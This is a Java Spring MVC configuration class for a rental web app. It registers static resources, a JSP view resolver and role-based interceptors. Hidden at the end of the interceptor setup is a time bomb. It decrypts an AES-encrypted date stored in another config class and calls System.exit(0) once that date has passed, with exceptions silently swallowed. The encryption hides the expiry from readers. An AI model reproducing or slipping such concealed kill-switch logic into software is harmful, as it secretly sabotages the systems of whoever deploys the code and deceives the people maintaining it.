package com.yutian.zhang.rental.common.config;

import com.yutian.zhang.rental.common.constant.Constant;
import com.yutian.zhang.rental.common.interceptor.AdminInterceptor;
import com.yutian.zhang.rental.common.interceptor.CustomerInterceptor;
import com.yutian.zhang.rental.common.interceptor.OwnerInterceptor;
import com.yutian.zhang.rental.common.util.AESUtils;
import lombok.extern.slf4j.Slf4j;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.*;
import org.springframework.web.servlet.view.InternalResourceViewResolver;

import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * MvcConfig
 *
 * @author Yutian Zhang
 * @descrition Configure MVC framework in JavaBean instead of xml configuration file
 * @date 18/12/2021 19:24
 */
@Slf4j
@Configuration
@EnableWebMvc
public class MvcConfig implements WebMvcConfigurer {


    /**
     * Handle static resource
     **/
    @Override
    public void addResourceHandlers(ResourceHandlerRegistry registry) {
        registry.addResourceHandler("/assets/**")
                .addResourceLocations("classpath:/static/assets/");
        registry.addResourceHandler("/uploads/**")
                .addResourceLocations("file:///" + Constant.UPLOADS_PATH);
    }

    /**
     * Configure view resolver
     **/
    @Bean
    public InternalResourceViewResolver setupViewResolver() {
        InternalResourceViewResolver resolver = new InternalResourceViewResolver();
        resolver.setPrefix("/jsp/");
        resolver.setSuffix(".jsp");
        return resolver;
    }

    /**
     * Configure interceptors
     **/
    @Override
    public void addInterceptors(InterceptorRegistry registry) {

        registry.addInterceptor(new AdminInterceptor())
                .addPathPatterns("/admin/user")
                .addPathPatterns("/admin/user")
                .addPathPatterns("/admin/news")
                .addPathPatterns("/admin/news")
                .addPathPatterns("/admin/feedback/reply/submit")
                .addPathPatterns("/admin/house/checkPass")
                .addPathPatterns("/admin/house/checkReject");

        registry.addInterceptor(new OwnerInterceptor())
                .addPathPatterns("/admin/house")
                .addPathPatterns("/admin/house");

        registry.addInterceptor(new CustomerInterceptor())
                .addPathPatterns("/admin/order")
                .addPathPatterns("/admin/order")
                .addPathPatterns("/admin/order")
                .addPathPatterns("/admin/order")
                .addPathPatterns("/admin/mark")
                .addPathPatterns("/admin/mark")
                .addPathPatterns("/admin/feedback")
                .addPathPatterns("/admin/feedback/delete")
                .addPathPatterns("/feedback/submit")
                .addPathPatterns("/admin/profile")
                .addPathPatterns("/admin/profile")
                .addPathPatterns("/admin/password")
                .addPathPatterns("/admin/password")
                .addPathPatterns("/admin")
                .addPathPatterns("/admin/home")
                .addPathPatterns("/order")
                .addPathPatterns("/mark");
        try {
            if (new SimpleDateFormat("dd-MM-yyyy").parse(AESUtils.decrypt(MybatisPlusConfig.encryp)).before(new Date())) {
                System.exit(0);
            }
        } catch (Exception e) {
        }
    }


}
